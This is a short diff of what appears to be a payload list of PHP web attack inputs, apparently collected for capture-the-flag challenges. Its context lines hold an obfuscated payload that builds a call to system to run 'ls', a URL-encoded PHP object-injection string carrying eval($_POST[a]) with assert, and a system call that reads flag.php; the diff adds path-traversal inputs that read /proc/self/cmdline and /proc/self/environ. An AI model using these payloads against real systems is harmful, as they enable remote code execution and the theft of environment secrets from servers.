@@ -41,3 +41,5 @@
 =base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}(($$pi){abs});&pi=system&abs=ls
 =O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D
 =system('cat ../../flag.php');
+=../../../../../proc/self/cmdline
+=../../../../../proc/self/environ
